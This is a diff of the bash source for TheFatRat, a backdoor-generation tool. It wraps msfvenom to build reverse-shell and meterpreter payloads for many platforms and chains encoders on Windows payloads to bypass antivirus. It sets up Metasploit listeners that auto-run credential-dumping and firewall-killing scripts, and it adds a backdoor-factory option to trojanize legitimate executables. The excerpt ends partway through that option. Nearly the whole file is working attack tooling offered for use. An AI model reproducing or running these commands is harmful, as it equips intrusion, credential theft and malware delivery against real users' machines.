@@ -1,20 +1,20 @@
 #!/bin/bash
 
 
-#============================================================================================================	
+#============================================================================================================
 #				THEFATRAT
-#  
-#		 	Welcome and dont disclaimer 
-# 		      fatrat Author By Edo -maland- 
-#		  Tested On Kali Linux and Kali sana v.2 
+#
+#		 	Welcome and dont disclaimer
+# 		      fatrat Author By Edo -maland-
+#		  Tested On Kali Linux and Kali sana v.2
 #		    contact me in screetsec@gmail.com
-#        OS Penetration From Indonesia : http://dracos-linux.org/ 
-# Easy tool for generate backdoor with msfvenom ( part of metasploit framework ) 
-# and program compiles a C program with a meterpreter reverse_tcp payload In it that can then be executed on 
+#        OS Penetration From Indonesia : http://dracos-linux.org/
+# Easy tool for generate backdoor with msfvenom ( part of metasploit framework )
+# and program compiles a C program with a meterpreter reverse_tcp payload In it that can then be executed on
 # a windows host Program to create a C program after it is compiled that will bypass most AV
 #============================================================================================================
 
-#This colour 
+#This colour
 cyan='\e[0;36m'
 green='\e[0;34m'
 okegreen='\033[92m'
@@ -28,9 +28,8 @@ BlueF='\e[1;34m'
 
 #Checking
 [[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
-resize -s 30 73
-clear                                   
-SERVICE=service;
+resize -s 30 73 > /dev/null
+clear
 
 
 #Check for gcc compiler
@@ -48,10 +47,10 @@ else
     else
     echo ""
     echo -e "\e[01;31m[!]\e[00m Unable to find the required gcc program, install i586-mingw32msvc-gcc or i686-w64-mingw32-gcc (Arch) and try again"
-    echo""
-    echo "Do you want install mingw tool in the system for fix problem [Y/n]" ; 
+    echo ""
+    echo "Do you want install mingw tool in the system for fix problem [Y/n]" ;
 read bebe
-if [ $bebe == "y" ] ; 
+if [ $bebe == "y" ] ;
   then
     apt-get update
     clear
@@ -65,10 +64,93 @@ fi
 fi
 
 
+#Check for backdoor-factory
+
+which backdoor-factory >/dev/null 2>&1
+
+if [ $? -eq 0 ]; then
+    echo ""
+    backdoor="backdoor-factory"
+    else
+    echo ""
+    echo -e "\e[01;31m[!]\e[00m Unable to find the backdoor-factory, install "
+    echo ""
+    echo "Do you want install backdoor-factory in the system for fix problem [Y/n]" ;
+read bebe
+if [ $bebe == "y" ] ;
+  then
+    apt-get update
+    clear
+    apt-get install backdoor-factory
+  else
+    exit
+fi
+    echo ""
+    exit 1
+
+fi
+
+
+# spinner for Metasploit Generator
+spinlong ()
+{
+    bar=" +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ "
+    barlength=${#bar}
+    i=0
+    while ((i < 100)); do
+        n=$((i*barlength / 100))
+        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
+        ((i += RANDOM%5+2))
+        sleep 0.02
+    done
+}
+
+
+# spinner for random seed generator
+spinlong2 ()
+{
+    bar=" 01100111001001001110111001101010101010110101001010111001010101010101010"
+    barlength=${#bar}
+    i=0
+    while ((i < 100)); do
+        n=$((i*barlength / 100))
+        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
+        ((i += RANDOM%5+2))
+        sleep 0.02
+    done
+}
+
+#for checking if your command is correct
+gboor ()
+{
+cat << !
+  Generate Backdoor
+  +------------++-------------------------++-----------------------+
+  | Name       ||  Descript   	          || Your Input
+  +------------++-------------------------++-----------------------+
+  | LHOST      ||  The Listen Addres      || $yourip
+  | LPORT      ||  The Listen Ports       || $yourport
+  | OUTPUTNAME ||  The Filename output    || $fira
+  +------------++-------------------------++-----------------------+
+
+
+!
+}
+
+#####################
+#  Some Variables
+#####################
+path=`pwd`
+Versi=1.5
+codename=Unity
+SERVICE=service;
+
+
+
 #########################
 #CHECK DEPENDICS
 #########################
-echo -e $cyan"   ____ _               _    _                   "      
+echo -e $cyan"   ____ _               _    _                   "
 echo "  / ___| |__   ___  ___| | _(_)_ __   __ _             "
 echo " | |   | '_ \ / _ \/ __| |/ / | '_ \ / _\ |            "
 echo " | |___| | | |  __/ (__|   <| | | | | (_| |  _   _   _ "
@@ -91,7 +173,7 @@ if [ $(id -u) != "0" ]; then
 
 
 else
-   
+
    echo [!]::[Check Dependencies]: ;
    sleep 1
    echo [*]::[Check User]: $USER ;
@@ -104,7 +186,7 @@ fi
 then
 
     echo [*]::[Internet Connection]: DONE!;
-    echo [x]::[ warning ]: This Script Needs An Active Internet Connection;
+    echo [x]::[warning]: This Script Needs An Active Internet Connection;
     sleep 2
 
 else
@@ -165,39 +247,37 @@ else
     echo " 			    |       *     | "
     echo " 			    \             / "
     echo " 			     \   |_w_|   / "
-    echo " 			     _)  \   /  (_ " 
+    echo " 			     _)  \   /  (_ "
     echo "			jgs (((---'   '---))) "
     echo -e $cyan":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
     echo -e $white":::::::::::::::: Wait for starting a Service  Postgresql ::::::::::::::::"
     echo -e $cyan":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
     service postgresql start
-    read -p "Press [Enter] key to Continue..." 
-    clear 
-fi 
+    read -p "Press [Enter] key to Continue..."
+    clear
+fi
 
 
 
 function cmsfvenom() {
 clear
-
 echo -e $okegreen"  ===================================================================== "
-echo -e " |  $cyan  Create Payload with msfvenom ( must install msfvenom )  $okegreen         | " 
+echo -e " |  $cyan  Create Payload with msfvenom ( must install msfvenom )  $okegreen         | "
 echo -e $okegreen"  ===================================================================== "
 echo -e $red"  ___________ "
 echo -e " |           |======[***   $yellow    ____                _             "
 echo -e $red" | $yellow MSFVENOM $red \ 	    $yellow / ___|_ __ ___  ____| |_ ___  _ __ "
 echo -e $red" |_____________\_______    $yellow  | |   | '__/ _ \/ _  | __/ _ \| '__|"
-echo -e $red" |==[msf >]============\   $yellow  | |___| | |  __/ (_| | || (_) | |   "
-echo -e $red" |______________________\  $yellow   \____|_|  \___|\____|\__\___/|_|    "                                 
+echo -e $red" |==[v1.2 >]===========\   $yellow  | |___| | |  __/ (_| | || (_) | |   "
+echo -e $red" |______________________\  $yellow   \____|_|  \___|\____|\__\___/|_|    "
 echo -e $yellow"  \(@)(@)(@)(@)(@)(@)(@)/ "
 echo -e $red"  *********************  "
 echo ""
 echo -e $okegreen"  ===================================================================== "
-echo -e " |                     $cyan        Created by $red Edo Maland  ( Screetsec )  $okegreen | " 
+echo -e " |                     $cyan        Created by $red Edo Maland  ( Screetsec )  $okegreen | "
 echo -e $okegreen"  ===================================================================== "
-echo""
-
- 			echo -e $okegreen "	[1]  LINUX >> FatRat.ef"
+echo ""
+ 			echo -e $okegreen "	[1]  LINUX >> FatRat.elf"
  			echo -e "	[2]  WINDOWS >> FatRat.exe"
 			echo -e "        [3]  ANDROID >> FatRat.apk"
  			echo -e "	[4]  MAC >> FatRat.macho"
@@ -212,84 +292,172 @@ echo""
  			echo -e " "
  			echo -n -e $red'  \033[4mCreator$FATRAT:\033[0m>> '; tput sgr0 #insert your choice
  			read fatrat1
-			
 			if test $fatrat1 == '1'
 				then
-				cd "output"
-				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport
-         			msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport -f elf > FatRat.elf
+				echo ""
+				spinlong
+				echo ""
+				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "osx/ppc/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
+				spinlong
+				echo ""
+				echo ""
+				gboor
+				spinlong2
+				echo ""
+				echo ""
+         			msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f elf > output/$fira.elf
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '2'
 				then
-				cd "output"
-				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport
-         			msfvenom -p windows/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport -f raw -e x86/shikata_ga_nai -i 10 | msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/jmp_call_additive -i 1| msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 1 | msfvenom  -a x86 --platform windows -e x86/shikata_ga_nai -i 1 -f exe -o FatRat.exe
-          			echo -e "Shell Saved To output Folder "
+				echo ""
+				spinlong
+				echo ""
+				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" --width 350 --height 265) > /dev/null 2>&1
+         			echo ""
+				echo ""
+				gboor
+				spinlong2
+				echo ""
+				echo ""
+				msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f raw -e x86/shikata_ga_nai -i 10 | msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/jmp_call_additive -i 1| msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 1 | msfvenom  -a x86 --platform windows -e x86/shikata_ga_nai -i 1 -f exe -o output/$fira.exe
+				echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '3'
 				then
-				cd "output"
-				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport
-         			msfvenom -p android/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport R > FatRat.apk
-          			echo -e "Shell Saved To output Folder "
+				echo ""
+				spinlong
+				echo ""
+				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+				spinlong
+				echo ""
+				echo ""
+				gboor
+				spinlong2
+				echo ""
+				echo ""
+				msfvenom -p android/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport R > output/$fira.apk
+				echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '4'
 				then
-				cd "output"
-				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport
-         			msfvenom -p osx/x86/shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f macho > FatRat.macho
+				echo ""
+				spinlong
+				echo ""
+				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+				spinlong
+				echo ""
+				echo ""
+				gboor
+				spinlong2
+				echo ""
+				echo ""
+         			msfvenom -p osx/x86/shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f macho > output/$fira.macho
           			echo -e "Shell Saved To outputFolder "
 			elif test $fatrat1 == '5'
 				then
-				cd "output"
-				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport
-         			msfvenom -p php/meterpreter_reverse_tcp LHOST=$yourip LPORT=$yourport -f raw > FatRat.php
-				cat FatRat.php | pbcopy && echo '<?php ' | tr -d '\n' > FatRat.php && pbpaste >> FatRat.php
+				echo ""
+				spinlong
+				echo ""
+				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+				spinlong
+				echo ""
+				echo ""
+				gboor
+				spinlong2
+				echo ""
+				echo ""
+         			msfvenom -p php/meterpreter_reverse_tcp LHOST=$yourip LPORT=$yourport -f raw > output/$fira.php
+				cat output/$fira.php | pbcopy && echo '<?php ' | tr -d '\n' > output/$fira.php && pbpaste >> output/$fira.php
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '6'
 				then
-				cd "output"
-				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport
-         			msfvenom -p windows/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport -f asp > FatRat.asp
-          			echo -e "Shell Saved To output Folder " 
+				echo ""
+				spinlong
+				echo ""
+				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+				spinlong
+				echo ""
+				echo ""
+				gboor
+				spinlong2
+				echo ""
+				echo ""
+         			msfvenom -p windows/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport -f asp > output/$fira.asp
+          			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '7'
 				then
-				cd "output"
-				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport
-         			msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f raw > FatRat.jsp
+				echo ""
+				spinlong
+				echo ""
+				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+				spinlong
+				echo ""
+				echo ""
+				gboor
+				spinlong2
+				echo ""
+				echo ""
+         			msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f raw > output/$fira.jsp
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '8'
 				then
-				cd "output"
-				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport
-         			msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f war > FatRat.war
+				echo ""
+				spinlong
+				echo ""
+				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+				spinlong
+				echo ""
+				echo ""
+				gboor
+				spinlong2
+				echo ""
+				echo ""
+         			msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f war > output/$fira.war
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '9'
 				then
-				cd "output"
-				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport
-         			msfvenom -p cmd/unix/reverse_python LHOST=$yourip LPORT=$yourport -f raw > FatRat.py
+				echo ""
+				spinlong
+				echo ""
+				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+				spinlong
+				echo ""
+				echo ""
+				gboor
+				spinlong2
+				echo ""
+				echo ""
+         			msfvenom -p cmd/unix/reverse_python LHOST=$yourip LPORT=$yourport -f raw > output/$fira.py
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '10'
 				then
-				cd "output"
-				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport
-         			msfvenom -p cmd/unix/reverse_bash LHOST=$yourip LPORT=$yourport -f raw > FatRat.sh
+				echo ""
+				spinlong
+				echo ""
+				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+				spinlong
+				echo ""
+				echo ""
+				gboor
+				spinlong2
+				echo ""
+				echo ""
+         			msfvenom -p cmd/unix/reverse_bash LHOST=$yourip LPORT=$yourport -f raw > output/$fira.sh
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '11'
 				then
-				cd "output"
-				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport
-         			msfvenom -p cmd/unix/reverse_perl LHOST=$yourip LPORT=$yourport -f raw > FatRat.pl
+				echo ""
+				spinlong
+				echo ""
+				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+				spinlong
+				echo ""
+				echo ""
+				gboor
+				spinlong2
+				echo ""
+				echo ""
+         			msfvenom -p cmd/unix/reverse_perl LHOST=$yourip LPORT=$yourport -f raw > output/$fira.pl
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '12'
 				then
@@ -298,7 +466,8 @@ echo""
 	 	else
 			echo -e "  Incorrect Number"
 			fi
-			echo -n -e "  Do you want exit? ( Yes / No ) : "
+			echo ""
+			echo -n -e $okegreen"Do you want exit? ( Yes / No ) : "
 		read back
 			if [ $back != 'n' ] && [ $back != 'N' ]
 					then
@@ -307,24 +476,24 @@ echo""
 			elif [ $back != 'y' ] && [ $back != 'Y' ]
 					then
 					cmsfvenom
-			fi		
-			
+			fi
+
 }
 
 function clisteners() {
 clear
 echo -e $okegreen"  ===================================================================== "
-echo -e " |  $cyan  Create Listener with metasploit ( must install metasploit )  $okegreen    | " 
+echo -e " |  $cyan  Create Listener with metasploit ( must install metasploit )  $okegreen    | "
 echo -e $okegreen"  ===================================================================== "
-echo 
+echo
 echo -e $yellow"  _     _          _                           	^__^ "
 echo " | |   (_)___  ___| |_ ___ _ __   ___ _ __ ___ 	(oo)\_______ "
-echo " | |   | / __|/ _ \ __/ _ \ '_ \ / _ \ '__/ __|	(__)\       )\/\ "
+echo " | |   | / __|/ _ \ __/ _ \ '_ \ / _ \ '__/ __|	(__)\  v1.2 )\/\ "
 echo " | |___| \__ \  __/ ||  __/ | | |  __/ |  \__ \	     ||----w | "
 echo " |_____|_|___/\___|\__\___|_| |_|\___|_|  |___/	     ||     || "
 echo ""
 echo -e $okegreen"  ===================================================================== "
-echo -e " |                     $cyan        Created by $red Edo Maland  ( Screetsec )  $okegreen | " 
+echo -e " |                     $cyan        Created by $red Edo Maland  ( Screetsec )  $okegreen | "
 echo -e $okegreen"  ===================================================================== "
 			echo ""
  			echo -e $okegreen"	[1]  Liseners for payload linux"
@@ -335,12 +504,13 @@ echo -e $okegreen"  ============================================================
  			echo -e " "
  			echo -n -e $red'  \033[4mListeners$fatrat:\033[0m>> '; tput sgr0 #insert your choice
  			read fatrat1
-			
+
 			if test $fatrat1 == '1' #LINUX
-				then 
+				then
 				touch "temp/meterpreter_linux.rc"
            	 		echo use exploit/multi/handler > "temp/meterpreter_linux.rc"
-           	 		echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> "temp/meterpreter_linux.rc"
+				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "osx/ppc/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
+           	 		echo set PAYLOAD $payload >> "temp/meterpreter_linux.rc"
 				echo -e $okegreen ""
            	 		read -p '  Set LHOST IP: ' uservar
            	 		echo set LHOST $uservar >> "temp/meterpreter_linux.rc"
@@ -353,14 +523,17 @@ echo -e $okegreen"  ============================================================
 			elif test $fatrat1 == '2' #Windows
 				then
 				touch "temp/meterpreter_windows.rc"
-           	 		echo use exploit/multi/handler > "temp/meterpreter_windows.rc"
-           	 		echo set PAYLOAD windows/meterpreter/reverse_tcp >> "temp/meterpreter_windows.rc"
+           	 		echo use exploit/multi/handler >> "temp/meterpreter_windows.rc"
+				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" --width 350 --height 265) > /dev/null 2>&1
+           	 		echo set PAYLOAD $payload >> "temp/meterpreter_windows.rc"
+				pe=$(zenity --list --title "☣ TheFatRat ☣" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "auto_migrate+killfirewall.rc" --width 350 --height 240) > /dev/null 2>&1
 				echo -e $okegreen ""
            	 		read -p '  Set LHOST IP: ' uservar
            	 		echo set LHOST $uservar >> "temp/meterpreter_windows.rc"
            	 		read -p '  Set LPORT: ' uservar
            	 		echo set LPORT $uservar >> "temp/meterpreter_windows.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_windows.rc"
+				echo set AutoRunScript multi_console_command -rc $path/postexploit/$pe >> touch "temp/meterpreter_windows.rc"
            	 		echo exploit -j  >> "temp/meterpreter_windows.rc"
            	 		xterm -e msfconsole -r "temp/meterpreter_windows.rc" &
 				clear
@@ -392,7 +565,7 @@ echo -e $okegreen"  ============================================================
            	 		echo exploit -j  >> "temp/meterpreter_android.rc"
            	 		xterm -e msfconsole -r "temp/meterpreter_android.rc" &
 				clear
-			
+
 			elif test $fatrat1 == '5'
 				then
  				clear
@@ -409,9 +582,9 @@ echo -e $okegreen"  ============================================================
 					exit
 			elif [ $back != 'y' ] && [ $back != 'Y' ]
 					then
-					cmsfvenom
-			fi		
-			
+					clisteners
+			fi
+
 }
 
 
@@ -435,12 +608,13 @@ MSFCONSOLE=`which msfconsole` # Path to the msfconsole script
 
 #Checking
 [[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
-resize -s 36 73
+resize -s 36 73 > /dev/null
 clear
 SERVICE=service;
 
 #Checking Version
 VERSION="2.1"
+
 
 # spinner for Metasploit Generator
 spinlong ()
@@ -460,7 +634,7 @@ spinlong ()
 # spinner for random seed generator
 spinlong2 ()
 {
-    bar=" 01100111001001001110111001101010101010110101001010111001010101010101010" 
+    bar=" 01100111001001001110111001101010101010110101001010111001010101010101010"
     barlength=${#bar}
     i=0
     while ((i < 100)); do
@@ -470,7 +644,6 @@ spinlong2 ()
         sleep 0.02
     done
 }
-
 clear
 
 #MENU INTI
@@ -485,7 +658,7 @@ echo "   	               ..:::aad8888888baa:::..	"
 echo "   	           .::::d:?88888888888?::8b::::.	"
 echo "   	         .:::d8888:?88888888??a888888b:::.	"
 echo "   	       .:::d8888888a8888888aa8888888888b:::.	"
-echo "   	      ::::dP::::::::88888888888::::::::Yb::::	"	
+echo "   	      ::::dP::::::::88888888888::::::::Yb::::	"
 echo "   	     ::::dP:::::::::Y888888888P:::::::::Yb::::	"
 echo "   	    ::::d8:::::::::::Y8888888P:::::::::::8b::::	"
 echo "   	   .::::88::::::::::::Y88888P::::::::::::88::::.	"
@@ -510,9 +683,9 @@ echo -e $okegreen"          METASPLOIT SHELL A.V. FOR BYPASS AV THIS VERSION $VE
 echo -e $cyan"========================================================================"
 echo -e $cyan""
 # Set Output filename
-echo 
+echo
 echo -n -e "TYPE THE DESIRED OUTPUT FILENAME : $okegreen" ;
-read OUTPUTNAME	
+read OUTPUTNAME
 echo ""
 echo ""
 echo -n -e $cyan"TYPE THE DESIRED LABEL FOR THE AUTORUN FILES : $okegreen" ;
@@ -533,7 +706,6 @@ fi
 # Random Msfencode encoding iterations
 #ITER=`seq 5 10 |sort -R |sort -R | head -1`
 ITER=`shuf -i 10-20 -n 1`
-echo ""
 echo -ne  $cyan"TYPE YOUR LHOST : $okegreen" ;
 read IP
 echo ""
@@ -544,6 +716,7 @@ echo -ne $cyan"TYPE YOUR LPORT : $okegreen" ;
     echo ""
 echo ""
 echo -e "\e[01;32m[-]\e[00m Generating Metasploit payload, please wait..."
+echo ""
 echo ""
 spinlong
 #Payload creater
@@ -583,7 +756,7 @@ echo -e "                          ($okegreen"O"$red _ ____) "
 echo -e "                           ($okegreen"O"$red ____) "
 echo ""
 echo -e $cyan"================================================================= "
-echo "" 
+echo ""
 echo -e $okegreen""
 echo " 1. Normal [ 400K payload ]  - [ fast compile ]  "
 echo ""
@@ -698,7 +871,17 @@ echo -e "\e[01;32m[+]\e[00m I have also created 3 AutoRun files here: \e[01;32m"
 rm build.c >/dev/null 2>&1
 rm random >/dev/null 2>&1
 rm msf.c >/dev/null 2>&1
-rm msfhandler.rc
+rm msfhandler.rc >/dev/null 2>&1
+			echo -n -e $okegreen"Do you want exit? ( Yes / No ) : "
+		read back
+			if [ $back != 'n' ] && [ $back != 'N' ]
+					then
+					clear
+					exit
+			elif [ $back != 'y' ] && [ $back != 'Y' ]
+					then
+					menu
+			fi
 
 }
 
@@ -713,6 +896,8 @@ echo -e "
 echo
 echo -e $white "Special thanks to:"
 echo
+echo -e $red "Dracos Linux ( www.dracos-linux.org )"
+echo
 echo -e $red "Offensive Security for the awesome OS"
 echo
 echo -e $green "http://www.offensive-security.com/"
@@ -724,11 +909,10 @@ echo
 echo -e $white "http://www.linuxsec.org/"
 echo
 echo -e $red "Big Thanks to : http://www.github.com/"
-echo 
+echo
 
 
 }
-
 
 ###################################################################
 # MENU FATRAT
@@ -745,10 +929,10 @@ echo -e $okegreen"      .<     __O     $okegreen  | | |   | -_|   __| .'|  _|   
 echo -e $okegreen"     /\ \.-.' \      $okegreen  |_| |_|_|___|__|  |___|_| |__|__|___|_|  	"
 echo -e $okegreen"    J  \.|'.\/ \                  				"
 echo -e $okegreen"    | |_.|. | | |   $white"[$okegreen--$white] $cyan " $white"Backdoor" Creator for Remote Acces $white[$okegreen--$white] 	"
-echo -e $okegreen"     \__.' .|-' /   $white"[$okegreen--$white] $cyan" Created by: "$red"Edo Maland (Screetsec) $white[$okegreen--$white]	"	
-echo -e $okegreen"     L   /|o'--'\   $white"[$okegreen--$white] $cyan"           Version: $red"1.4"              $white[$okegreen--$white]	"
-echo -e $okegreen"     |  /\/\/\   \  $white"[$okegreen--$white] $cyan"         Codename: $red"Xenogenesis"      $white[$okegreen--$white]    "
-echo -e $okegreen"     J /      \.__\ $white"[$okegreen--$white] $cyan"  Follow me on Github: $red@Screetsec   $white[$okegreen--$white]	"	
+echo -e $okegreen"     \__.' .|-' /   $white"[$okegreen--$white] $cyan" Created by: "$red"Edo Maland (Screetsec) $white[$okegreen--$white]	"
+echo -e $okegreen"     L   /|o'--'\   $white"[$okegreen--$white] $cyan"           Version: $red"$Versi"             $white[$okegreen--$white]	"
+echo -e $okegreen"     |  /\/\/\   \  $white"[$okegreen--$white] $cyan"         Codename: $red"$codename"            $white[$okegreen--$white]    "
+echo -e $okegreen"     J /      \.__\ $white"[$okegreen--$white] $cyan"  Follow me on Github: $red@Screetsec   $white[$okegreen--$white]	"
 echo -e $okegreen"     |/         /   $white"[$okegreen--$white] $cyan"   				     $white[$okegreen--$white]		"
 echo -e $okegreen"       \      .'\.  $white"[$okegreen--$white]$white "    SELECT AN OPTION TO BEGIN:      $white[$okegreen--$white]  "
 echo -e $okegreen"    ____)_/\_(___\. $white"[$okegreen--$white] ".___________________________________$white[$okegreen--$white]	"
@@ -757,18 +941,20 @@ echo
 
 
 		echo -e $white " "
-		echo -e $white"	[$okegreen"1"$white]$okegreen CREATE BACKDOOR WITH MSFVENOM "
-		echo -e $white"	[$okegreen"2"$white]$okegreen CREATE FUD 100% BACKDOOR ( SLOW BUT POWERFULL ) "
-		echo -e $white"	[$okegreen"3"$white]$okegreen CREATE FUD BACKDOOR WITH AVOID 1.2  "
-		echo -e $white"	[$okegreen"4"$white]$okegreen CREATE A LISTENERS  "
-		echo -e $white"	[$okegreen"5"$white]$okegreen JUMP TO MSFCONSOLE  "
-		echo -e $white"	[$okegreen"6"$white]$okegreen SEARCHSPLOIT  "
-		echo -e $white"	[$okegreen"7"$white]$okegreen HELP  "
-		echo -e $white"	[$okegreen"8"$white]$okegreen CREDITS  "
+		echo -e $white"	[$okegreen"1"$white]$okegreen  CREATE BACKDOOR WITH MSFVENOM "
+		echo -e $white"	[$okegreen"2"$white]$okegreen  CREATE FUD 100% BACKDOOR ( SLOW BUT POWERFULL ) "
+		echo -e $white"	[$okegreen"3"$white]$okegreen  CREATE FUD BACKDOOR WITH AVOID V1.2  "
+		echo -e $white"	[$okegreen"4"$white]$okegreen  CREATE FUD BACKDOOR WITH BACKDOOR-FACTORY  "
+		echo -e $white"	[$okegreen"5"$white]$okegreen  CREATE A LISTENERS  "
+		echo -e $white"	[$okegreen"6"$white]$okegreen  JUMP TO MSFCONSOLE  "
+		echo -e $white"	[$okegreen"7"$white]$okegreen  SEARCHSPLOIT  "
+		echo -e $white"	[$okegreen"8"$white]$okegreen  CLEANUP  "
+		echo -e $white"	[$okegreen"9"$white]$okegreen  HELP  "
+		echo -e $white"	[$okegreen"10"$white]$okegreen CREDITS  "
 		echo -e " "
 		echo -n -e $red'  \033[4mScreetsec@Fatrat:\033[0m '; tput sgr0 #insert your choice
 		read fatrat
-	
+
 		if test $fatrat == '1'
 			then
 			cmsfvenom
@@ -781,16 +967,35 @@ echo
 		elif test $fatrat == '3'
 			then
 			avoid
-			
+
 		elif test $fatrat == '4'
+			then
+				echo ""
+				spinlong
+				echo ""
+				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira; read -p '  Located PE file for embed (example:/Download/Avast.exe) : ' embed
+				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "cave_miner_inline" FALSE "iat_reverse_tcp_inline" FALSE "iat_reverse_tcp_inline_threaded" FALSE "iat_reverse_tcp_stager_threaded" FALSE "iat_user_supplied_shellcode_threaded" FALSE "meterpreter_reverse_https_threaded" FALSE "reverse_shell_tcp_inline" FALSE "reverse_tcp_stager_threaded" FALSE "user_supplied_shellcode_threaded" --width 350 --height 300) > /dev/null 2>&1
